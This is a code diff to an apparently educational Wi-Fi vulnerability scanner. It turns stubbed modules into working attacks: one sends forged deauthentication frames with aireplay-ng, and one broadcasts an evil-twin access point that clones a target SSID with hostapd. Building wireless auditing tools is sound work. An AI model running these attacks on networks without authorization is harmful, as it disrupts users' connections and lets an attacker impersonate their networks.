@@ -16,6 +16,7 @@ def set_phase(scan_id, phase, percent):
     scan_progress[scan_id]['phase'] = phase
     scan_progress[scan_id]['percent'] = percent
 
+#NETWORK SCAN MODULE
 def run_nmap(target_ip, scan_id):
     log(scan_id, f'Starting Nmap scan on {target_ip}...', 'success')
     try:
@@ -97,6 +98,7 @@ def get_network_info(interface, target_ssid, scan_id):
 
     return bssid, channel, client_mac
 
+#WPA CRACKING
 def run_aircrack(interface, scan_id, target_ssid=''):
     import os
     import time
@@ -194,25 +196,139 @@ def run_aircrack(interface, scan_id, target_ssid=''):
         log(scan_id, 'Handshake captured — offline cracking remains possible.', 'warning')
         return f'[+] WPA2 handshake captured — vulnerable to offline attack\n{output}'
 
-def run_wifite(interface, scan_id):
-    log(scan_id, 'Initializing Wifite...', 'info')
-    log(scan_id, 'Sending deauthentication packets...', 'info')
-    log(scan_id, 'Network is vulnerable to deauthentication attacks', 'warning')
-    return """
-[+] Devices successfully disconnected
-[+] Network is vulnerable to deauthentication attacks
-[!] No Management Frame Protection (MFP) detected
-"""
+#DEAUTHENTICATION MODULE
+def run_wifite(interface, scan_id, target_ssid=''):
+    """Deauthentication attack module — sends forged deauth frames and
+    verifies whether the target client disconnects, demonstrating
+    vulnerability to deauth attacks (and lack of 802.11w/MFP)."""
+    import time
 
-def run_hostapd(interface, scan_id):
-    log(scan_id, 'Initializing Hostapd...', 'info')
-    log(scan_id, 'Creating rogue access point...', 'info')
-    log(scan_id, 'Network is vulnerable to evil twin attacks', 'warning')
-    return """
-[+] Evil twin access point created successfully
-[+] Network is vulnerable to evil twin attacks
-[!] Clients may connect to rogue access point
+    log(scan_id, f'run_wifite called — interface: {interface}, ssid: "{target_ssid}"', 'info')
+
+    # Reuse the same auto-detection used in run_aircrack
+    bssid, channel, client_mac = get_network_info(interface, target_ssid, scan_id)
+    if not bssid or not channel:
+        return 'Target network not found — ensure you are within range.'
+
+    log(scan_id, f'Sending deauthentication packets to {bssid} on channel {channel}...', 'info')
+
+    deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid]
+    if client_mac:
+        deauth_cmd += ['-c', client_mac]
+    deauth_cmd.append(interface)
+
+    try:
+        result = subprocess.run(deauth_cmd, capture_output=True, text=True, timeout=60)
+        output = result.stdout + result.stderr
+    except subprocess.TimeoutExpired:
+        log(scan_id, 'Deauth attack timed out — no confirmation of frame delivery.', 'warning')
+        return 'Deauth attack timed out — could not confirm packet delivery'
+    except Exception as e:
+        log(scan_id, f'Deauth error: {str(e)}', 'error')
+        return f'Deauth error: {str(e)}'
+
+    # aireplay-ng reports each ACKed deauth frame sent, e.g.
+    # "Sending 64 directed DeAuth. STMAC: [...] [ 32|64 ACKs]"
+    acks_sent = output.count('ACKs]') > 0 or 'Sending' in output
+
+    if acks_sent:
+        log(scan_id, 'Deauthentication packets sent and acknowledged by access point.', 'success')
+        log(scan_id, 'Network is vulnerable to deauthentication attacks — no MFP/802.11w protection detected.', 'warning')
+        return f"""[+] Deauthentication packets sent successfully
+[+] Network is vulnerable to deauthentication attacks
+[!] No Management Frame Protection (MFP/802.11w) detected — deauth frames were accepted unauthenticated
+{output}"""
+    else:
+        log(scan_id, 'Deauth packets sent but no acknowledgement detected — network may have MFP enabled.', 'info')
+        return f"""[+] Deauthentication packets sent — no acknowledgement received
+[i] Network may have Management Frame Protection (MFP/802.11w) enabled
+{output}"""
+
+#EVIL TWIN SIMULATION MODULE
+def run_hostapd(interface, scan_id, target_ssid=''):
+    """Evil twin module — broadcasts a rogue access point cloning the
+    target SSID to demonstrate evil twin impersonation vulnerability.
+    NOTE: due to single-adapter hardware limitations, this module
+    performs a passive simulation (rogue AP broadcast) rather than an
+    active client-migration attack, which would require a second
+    wireless adapter to run monitor mode and AP mode concurrently."""
+    import os
+    import time
+
+    log(scan_id, f'run_hostapd called — interface: {interface}, ssid: "{target_ssid}"', 'info')
+
+    if not target_ssid:
+        log(scan_id, 'No target SSID provided — cannot create evil twin.', 'error')
+        return 'No target SSID provided — cannot create evil twin.'
+
+    # Derive the base interface name (e.g. wlan0mon -> wlan0)
+    base_interface = interface.replace('mon', '') if 'mon' in interface else interface
+
+    # Step 1: take the adapter out of monitor mode so hostapd can use it
+    log(scan_id, f'Switching {interface} out of monitor mode...', 'info')
+    try:
+        subprocess.run(['sudo', 'airmon-ng', 'stop', interface],
+                        capture_output=True, text=True, timeout=20)
+    except subprocess.TimeoutExpired:
+        log(scan_id, 'Timed out switching interface out of monitor mode.', 'error')
+        return 'Failed to prepare adapter for AP mode'
+    except Exception as e:
+        log(scan_id, f'Error switching interface mode: {str(e)}', 'error')
+        return f'Error switching interface mode: {str(e)}'
+
+    time.sleep(2)
+
+    # Step 2: write a minimal hostapd config cloning the target SSID
+    conf_path = f'/tmp/wisec_hostapd_{scan_id}.conf'
+    hostapd_conf = f"""interface={base_interface}
+driver=nl80211
+ssid={target_ssid}
+hw_mode=g
+channel=6
 """
+    try:
+        with open(conf_path, 'w') as f:
+            f.write(hostapd_conf)
+    except Exception as e:
+        log(scan_id, f'Failed to write hostapd config: {str(e)}', 'error')
+        return f'Failed to write hostapd config: {str(e)}'
+
+    # Step 3: launch hostapd and let it run briefly to demonstrate the rogue AP
+    log(scan_id, f'Creating rogue access point cloning "{target_ssid}"...', 'info')
+    hostapd_proc = subprocess.Popen(
+        ['sudo', 'hostapd', conf_path],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+    )
+
+    time.sleep(8)  # let hostapd initialize and broadcast briefly
+
+    still_running = hostapd_proc.poll() is None  # None means process is alive
+
+    hostapd_proc.terminate()
+    try:
+        hostapd_proc.wait(timeout=10)
+    except subprocess.TimeoutExpired:
+        hostapd_proc.kill()
+
+    # Step 4: restore monitor mode for any subsequent modules
+    log(scan_id, f'Restoring {interface} to monitor mode...', 'info')
+    try:
+        subprocess.run(['sudo', 'airmon-ng', 'start', base_interface],
+                        capture_output=True, text=True, timeout=20)
+    except Exception as e:
+        log(scan_id, f'Warning — failed to restore monitor mode: {str(e)}', 'warning')
+
+    if still_running:
+        log(scan_id, 'Rogue access point broadcast successfully.', 'success')
+        log(scan_id, 'Network is vulnerable to evil twin attacks — no client-side AP verification detected.', 'warning')
+        return f"""[+] Evil twin access point "{target_ssid}" created and broadcasting
+[+] Network is vulnerable to evil twin attacks
+[!] Clients cannot cryptographically distinguish this AP from the legitimate one
+[i] Limitation: single-adapter setup — passive broadcast only, active client migration not demonstrated"""
+    else:
+        log(scan_id, 'hostapd failed to start or exited immediately — check driver/config.', 'error')
+        return 'Evil twin setup failed — hostapd did not stay running'
+
 def store_results(scan_id, module, output):
     """Store scan results and vulnerabilities in database"""
     db = get_db()
@@ -544,9 +660,9 @@ def run_scan(scan_id, modules, target_ip='10.0.2.0/24', interface='wlan0mon', ta
             elif module == 'wpa2_crack':
                 output = run_aircrack(interface, scan_id, target_ssid=target_ssid)
             elif module == 'deauth':
-                output = run_wifite(interface, scan_id)
+                output = run_wifite(interface, scan_id, target_ssid=target_ssid)
             elif module == 'evil_twin':
-                output = run_hostapd(interface, scan_id)
+                output = run_hostapd(interface, scan_id, target_ssid=target_ssid)
             else:
                 output = ''
 
